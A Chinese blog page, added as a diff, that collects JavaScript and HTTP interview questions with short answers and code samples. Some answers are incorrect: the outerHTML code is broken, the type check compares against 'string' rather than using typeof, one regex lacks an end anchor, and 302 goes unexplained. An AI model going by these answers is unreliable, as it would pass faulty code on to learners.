@@ -1,0 +1,1575 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+  <meta name="baidu-site-verification" content="hbge3GnQvk" />
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="js," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Honey Young" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="正则表达式写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串^[a-zA-Z]{1}[\w]{5,29}$ 写出正确的正则表达式匹配固话号区号3-4位，第一位为0，中横线，7-8位数字，中横线，3-4位分机号格式的固话号 ^[0]\d{2,3}\-\d{7,8}\-\d{3,4}$ 要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成^(?=.*\d)(?=.*[a-">
+<meta name="keywords" content="js">
+<meta property="og:type" content="article">
+<meta property="og:title" content="题库-js篇(下)">
+<meta property="og:url" content="http://yoursite.com/2016/05/18/题库-js篇（下）/index.html">
+<meta property="og:site_name" content="Honey Young">
+<meta property="og:description" content="正则表达式写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串^[a-zA-Z]{1}[\w]{5,29}$ 写出正确的正则表达式匹配固话号区号3-4位，第一位为0，中横线，7-8位数字，中横线，3-4位分机号格式的固话号 ^[0]\d{2,3}\-\d{7,8}\-\d{3,4}$ 要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成^(?=.*\d)(?=.*[a-">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2018-06-04T09:32:28.969Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="题库-js篇(下)">
+<meta name="twitter:description" content="正则表达式写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串^[a-zA-Z]{1}[\w]{5,29}$ 写出正确的正则表达式匹配固话号区号3-4位，第一位为0，中横线，7-8位数字，中横线，3-4位分机号格式的固话号 ^[0]\d{2,3}\-\d{7,8}\-\d{3,4}$ 要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成^(?=.*\d)(?=.*[a-">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'honey young'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2016/05/18/题库-js篇（下）/"/>
+
+
+
+
+
+  <title>题库-js篇(下) | Honey Young</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Honey Young</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">小杨鹤</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/05/18/题库-js篇（下）/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="honey young">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/header.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Honey Young">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">题库-js篇(下)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-05-18T00:00:00+08:00">
+                2016-05-18
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/题库系列/" itemprop="url" rel="index">
+                    <span itemprop="name">题库系列</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><h3 id="写出由字母开头，其余由数字、字母、下划线组成的-6-30-的字符串"><a href="#写出由字母开头，其余由数字、字母、下划线组成的-6-30-的字符串" class="headerlink" title="写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串"></a>写出由字母开头，其余由数字、字母、下划线组成的 6~30 的字符串</h3><p><code>^[a-zA-Z]{1}[\w]{5,29}$</code></p>
+<h3 id="写出正确的正则表达式匹配固话号"><a href="#写出正确的正则表达式匹配固话号" class="headerlink" title="写出正确的正则表达式匹配固话号"></a>写出正确的正则表达式匹配固话号</h3><p>区号3-4位，第一位为0，中横线，7-8位数字，中横线，3-4位分机号格式的固话号</p>
+<p><code>^[0]\d{2,3}\-\d{7,8}\-\d{3,4}$</code></p>
+<h3 id="要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成"><a href="#要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成" class="headerlink" title="要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成"></a>要求最短6位数，最长20位，阿拉伯数和英文字母（不区分大小写）组成</h3><p><code>^(?=.*\d)(?=.*[a-z])(?=.*[A-Z])[a-zA-Z\d]{6,20}$</code></p>
+<h2 id="输出结果是"><a href="#输出结果是" class="headerlink" title="输出结果是"></a>输出结果是</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var bool = !!2; </span><br><span class="line">alert(bool)；//true;</span><br></pre></td></tr></table></figure>
+<p>双向非操作可以把字符串和数字转换为布尔值。</p>
+<a id="more"></a>
+<h2 id="声明对象，添加属性，输出属性"><a href="#声明对象，添加属性，输出属性" class="headerlink" title="声明对象，添加属性，输出属性"></a>声明对象，添加属性，输出属性</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">  name: <span class="string">'leipeng'</span>,</span><br><span class="line">  showName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.showName();</span><br></pre></td></tr></table></figure>
+<h2 id="匹配输入的字符：第一个必须是字母或下划线开头，长度5-20"><a href="#匹配输入的字符：第一个必须是字母或下划线开头，长度5-20" class="headerlink" title="匹配输入的字符：第一个必须是字母或下划线开头，长度5-20"></a>匹配输入的字符：第一个必须是字母或下划线开头，长度5-20</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> reg = <span class="regexp">/^[a-zA-Z_][a-zA-Z0-9_]&#123;5,20&#125;/</span>,</span><br><span class="line">    name1 = <span class="string">'leipeng'</span>,</span><br><span class="line">    name2 = <span class="string">'0leipeng'</span>,</span><br><span class="line">    name3 = <span class="string">'你好leipeng'</span>,</span><br><span class="line">    name4 = <span class="string">'hi'</span>;</span><br><span class="line">alert(reg.test(name1));</span><br><span class="line">alert(reg.test(name2));</span><br><span class="line">alert(reg.test(name3));</span><br><span class="line">alert(reg.test(name4));</span><br></pre></td></tr></table></figure>
+<h2 id="检测变量类型"><a href="#检测变量类型" class="headerlink" title="检测变量类型"></a>检测变量类型</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkStr</span>(<span class="params">str</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> str == <span class="string">'string'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(checkStr(<span class="string">"aaa"</span>));</span><br></pre></td></tr></table></figure>
+<h2 id="如何在HTML中添加事件"><a href="#如何在HTML中添加事件" class="headerlink" title="如何在HTML中添加事件"></a>如何在HTML中添加事件</h2><blockquote>
+<p>标签之中直接添加 onclick=”fun()”;<br>JS添加 Eobj.onclick = method;<br>现代事件 IE： obj.attachEvent(‘onclick’, method)；<br>FF: obj.addEventListener(‘click’, method, false);</p>
+</blockquote>
+<h2 id="BOM对象有哪些，列举window对象"><a href="#BOM对象有哪些，列举window对象" class="headerlink" title="BOM对象有哪些，列举window对象"></a>BOM对象有哪些，列举window对象</h2><blockquote>
+<p>window对象 ，是JS的最顶层对象，其他的BOM对象都是window对象的属性；<br>document对象，文档对象；<br>location对象，浏览器当前URL信息；<br>navigator对象，浏览器本身信息；<br>screen对象，客户端屏幕信息；<br>history对象，浏览器访问历史信息；</p>
+</blockquote>
+<h2 id="代码实现-outerHTML"><a href="#代码实现-outerHTML" class="headerlink" title="代码实现 outerHTML"></a>代码实现 outerHTML</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//说明：outerHTML其实就是innerHTML再加上本身；</span></span><br><span class="line">  <span class="built_in">Object</span>.prototype.outerHTML = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> innerCon = <span class="keyword">this</span>.innerHTML, <span class="comment">//获得里面的内容</span></span><br><span class="line">        outerCon = <span class="keyword">this</span>.appendChild(innerCon); <span class="comment">//添加到里面</span></span><br><span class="line">    alert(outerCon); </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+<p>演示代码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div id=<span class="string">"outer"</span>&gt;</span><br><span class="line">       hello</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;script&gt;</span></span><br><span class="line"><span class="regexp">    Object.prototype.outerHTML = function() &#123;</span></span><br><span class="line"><span class="regexp">      var innerCon = this.innerHTML, /</span><span class="regexp">/获得里面的内容</span></span><br><span class="line"><span class="regexp">      outerCon = this.appendChild(innerCon); /</span><span class="regexp">/添加到里面</span></span><br><span class="line"><span class="regexp">      alert(outerCon); </span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    function $(id)&#123;</span></span><br><span class="line"><span class="regexp">      return document.getElementById(id);</span></span><br><span class="line"><span class="regexp">    &#125;</span></span><br><span class="line"><span class="regexp">    alert($('outer').innerHTML);</span></span><br><span class="line"><span class="regexp">    alert($('outer').outerHTML);</span></span><br><span class="line"><span class="regexp">  &lt;/</span>script&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="JS中的简单继承-call方法！"><a href="#JS中的简单继承-call方法！" class="headerlink" title="JS中的简单继承 call方法！"></a>JS中的简单继承 call方法！</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//注意：类名都是首字母大写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Parent</span>(<span class="params">name, money</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.money = money;</span><br><span class="line">  <span class="keyword">this</span>.info = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">'姓名： '</span>+<span class="keyword">this</span>.name+<span class="string">' 钱： '</span>+ <span class="keyword">this</span>.money);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//定义孩子类</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Children</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line">  Parent.call(<span class="keyword">this</span>, name); <span class="comment">//继承 姓名属性，不要钱。  </span></span><br><span class="line">  <span class="keyword">this</span>.info = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    alert(<span class="string">'姓名： '</span>+<span class="keyword">this</span>.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//实例化类</span></span><br><span class="line"><span class="keyword">var</span> per = <span class="keyword">new</span> Parent(<span class="string">'parent'</span>, <span class="number">800000000000</span>);</span><br><span class="line"><span class="keyword">var</span> chi = <span class="keyword">new</span> Children(<span class="string">'child'</span>);</span><br><span class="line">per.info();</span><br><span class="line">chi.info();</span><br></pre></td></tr></table></figure>
+<h2 id="bind-live-delegate-的区别"><a href="#bind-live-delegate-的区别" class="headerlink" title="bind(), live(), delegate()的区别"></a>bind(), live(), delegate()的区别</h2><blockquote>
+<p>bind： 绑定事件，对新添加的事件不起作用，方法用于将一个处理程序附加到每个匹配元素的事件上并返回jQuery对象。<br>live： 方法将一个事件处理程序附加到与当前选择器匹配的所有元素（包含现有的或将来添加的）的指定事件上并返回jQuery对象。<br>delegate： 方法基于一组特定的根元素将处理程序附加到匹配选择器的所有元素（现有的或将来的）的一个或多个事件上。</p>
+</blockquote>
+<h2 id="如何优化自己的代码"><a href="#如何优化自己的代码" class="headerlink" title="如何优化自己的代码"></a>如何优化自己的代码</h2><blockquote>
+<p>代码重用<br>避免全局变量（命名空间，封闭空间，模块化mvc..）<br>拆分函数避免函数过于臃肿<br>注释</p>
+</blockquote>
+<h2 id="怎样实现两栏等高"><a href="#怎样实现两栏等高" class="headerlink" title="怎样实现两栏等高"></a>怎样实现两栏等高</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">"en"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;meta charset=<span class="string">"UTF-8"</span>&gt;</span><br><span class="line">  &lt;title&gt;Title&lt;<span class="regexp">/title&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;div id=<span class="string">"container"</span> style=<span class="string">"display: table; width: 100%;"</span>&gt;</span><br><span class="line">    &lt;div id=<span class="string">"left"</span> style=<span class="string">"background-color: red; display: table-cell;"</span>&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">      内容&lt;br/&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    &lt;div style="display:table-cell;"&gt;&lt;/</span>div&gt;</span><br><span class="line">    &lt;div id=<span class="string">"right"</span> style=<span class="string">"background-color: blue;display: table-cell"</span>&gt;</span><br><span class="line">        内容</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">  &lt;/</span>div&gt;</span><br><span class="line">&lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">&lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="使用js实现这样的效果"><a href="#使用js实现这样的效果" class="headerlink" title="使用js实现这样的效果"></a>使用js实现这样的效果</h2><p>在文本域里输入文字时，当按下enter键时不换行，而是替换成 <code>\{\{enter\}\}</code>, (只需要考虑在行尾按下enter键的情况).</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">  &lt;script&gt;</span><br><span class="line">    function back(ele,event)&#123;</span><br><span class="line">      event = event || window.event;</span><br><span class="line">      if(event.keyCode==13)&#123;</span><br><span class="line">        event.returnValue = false;</span><br><span class="line">        ele.value+=&quot;&#123;&#123;enter&#125;&#125;&quot;</span><br><span class="line">        return false;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">  &lt;textarea rows=&quot;3&quot; cols=&quot;40&quot; id=&quot;te&quot; onkeypress=&quot;back(this,event);&quot;&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="以下代码中end字符串什么时候输出"><a href="#以下代码中end字符串什么时候输出" class="headerlink" title="以下代码中end字符串什么时候输出"></a>以下代码中end字符串什么时候输出</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var t=true;</span><br><span class="line">setTimeout(function()&#123;</span><br><span class="line">  console.log(123);</span><br><span class="line">  t = false;</span><br><span class="line">&#125;, 1000);</span><br><span class="line">while(t)&#123;&#125;</span><br><span class="line">console.log(&apos;end&apos;);</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>结果：永远不输出</p>
+</blockquote>
+<h2 id="实现specify函数"><a href="#实现specify函数" class="headerlink" title="实现specify函数"></a>实现specify函数</h2><p><code>specify(&#39;hello,world&#39;) // =&gt;&#39;h,e,l,l,o,w,o,r,l,d&#39;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function specify(str)&#123;</span><br><span class="line">  var tempArray =  Array.prototype.filter.call(str,function (value, index, array) &#123;</span><br><span class="line">      return value &gt;= &apos;A&apos; &amp;&amp;  value &lt;= &apos;z&apos; &amp;&amp; value != &quot;_&quot;;</span><br><span class="line">  &#125;);</span><br><span class="line">  return tempArray.join(&quot;,&quot;);</span><br><span class="line">&#125;</span><br><span class="line">console.log(specify(&quot;hedd____df*(%$#a !!!))))))llo,Wo@@@r        ld&quot;)); //h,e,l,l,o,W,o,r,l,d</span><br></pre></td></tr></table></figure>
+<h2 id="简述-readyonly-与-disabled-的区别"><a href="#简述-readyonly-与-disabled-的区别" class="headerlink" title="简述 readyonly 与 disabled 的区别"></a>简述 readyonly 与 disabled 的区别</h2><p>ReadOnly 和 Disabled的作用是使用户不能够更改表单域中的内容.</p>
+<p>但是二者还是有着一些区别的：</p>
+<p>1、Readonly只针对input(text/password)和textarea有效，而disabled对于所有的表单元素有效，包括select,radio,checkbox,button等。</p>
+<p>2、在表单元素使用了disabled后，我们将表单以POST或者GET的方式提交的话，这个元素的值不会被传递出去，而readonly会将该值传递出去</p>
+<h2 id="解释ajax的工作原理"><a href="#解释ajax的工作原理" class="headerlink" title="解释ajax的工作原理"></a>解释ajax的工作原理</h2><blockquote>
+<p>Ajax的工作原理相当于在用户和服务器之间加了—个中间层，使用户操作与服务器响应异步化;<br>这样把以前的一些服务器负担的工作转嫁到客户端，利于客户端闲置的处理能力来处理;<br>减轻服务器和带宽的负担，从而达到节约 ISP 的空间及带宽租用成本的目的。<br>简单来说通过 XmlHttpRequest 对象来向服务器发异步请求<br>从服务器获得数据<br>然后用javascript来操作DOM而更新页面</p>
+</blockquote>
+<p>这其中最关键的一步就是从服务器获得请求数据。要清楚这个过程和原理，我们必须对 XMLHttpRequest有所了解。</p>
+<h2 id="为什么扩展javascript内置对象不是好的做法？"><a href="#为什么扩展javascript内置对象不是好的做法？" class="headerlink" title="为什么扩展javascript内置对象不是好的做法？"></a>为什么扩展javascript内置对象不是好的做法？</h2><p>因为你不知道哪一天浏览器或javascript本身就会实现这个方法，而且和你扩展的实现有不一致的表现。到时候你的javascript代码可能已经在无数个页面中执行了数年，而浏览器的实现导致所有使用扩展原型的代码都崩溃了。。。</p>
+<h2 id="什么是三元表达式？"><a href="#什么是三元表达式？" class="headerlink" title="什么是三元表达式？"></a>什么是三元表达式？</h2><p>三元运算符:</p>
+<p>三元如名字表示的三元运算符需要三个操作数。</p>
+<blockquote>
+<p>语法是 <code>条件 ? 结果1 : 结果2;</code></p>
+</blockquote>
+<p>这里你把条件写在问号(?)的前面后面跟着用冒号(:)分隔的结果1和结果2。满足条件时结果1否则结果2。</p>
+<h2 id="HTTP协议中，GET和POST有什么区别？分别适用什么场景-？"><a href="#HTTP协议中，GET和POST有什么区别？分别适用什么场景-？" class="headerlink" title="HTTP协议中，GET和POST有什么区别？分别适用什么场景 ？"></a>HTTP协议中，GET和POST有什么区别？分别适用什么场景 ？</h2><ul>
+<li>GET没有请求主体，使用xhr.send(null)</li>
+<li>GET可以通过在请求URL上添加请求参数</li>
+<li>POST可以通过xhr.send(‘name=itcast&amp;age=10’)</li>
+<li>POST需要设置</li>
+<li>GET效率更好（应用多）</li>
+<li>GET大小限制约4K，POST则没有限制</li>
+</ul>
+<h2 id="HTTP状态消息200-302-304-403-404-500分别表示什么"><a href="#HTTP状态消息200-302-304-403-404-500分别表示什么" class="headerlink" title="HTTP状态消息200 302 304 403 404 500分别表示什么"></a>HTTP状态消息200 302 304 403 404 500分别表示什么</h2><ul>
+<li>200 代表成功</li>
+<li>304 文档未修改</li>
+<li>403 没有权限</li>
+<li>404 未找到</li>
+<li>500 服务器错误</li>
+</ul>
+<h2 id="HTTP协议中，header-信息里面，怎么控制页面失效时间（last-modified-cache-control-Expires分别代表什么）"><a href="#HTTP协议中，header-信息里面，怎么控制页面失效时间（last-modified-cache-control-Expires分别代表什么）" class="headerlink" title="HTTP协议中，header 信息里面，怎么控制页面失效时间（last-modified, cache-control, Expires分别代表什么）"></a>HTTP协议中，header 信息里面，怎么控制页面失效时间（last-modified, cache-control, Expires分别代表什么）</h2><p>last-modified 文档的最后改动时间。</p>
+<p>客户可以通过 If-Modified-Since 请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。<br>Last-Modified 也可用 setDateHeader 方法来设置。</p>
+<p>cache-control 告诉所有的缓存机制是否可以缓存及哪种类型</p>
+<p>Expires 应该在什么时候认为文档已经过期，从而不再缓存它？</p>
+<p><a href="http://blog.chinaunix.net/" target="_blank" rel="noopener">header标头说明</a></p>
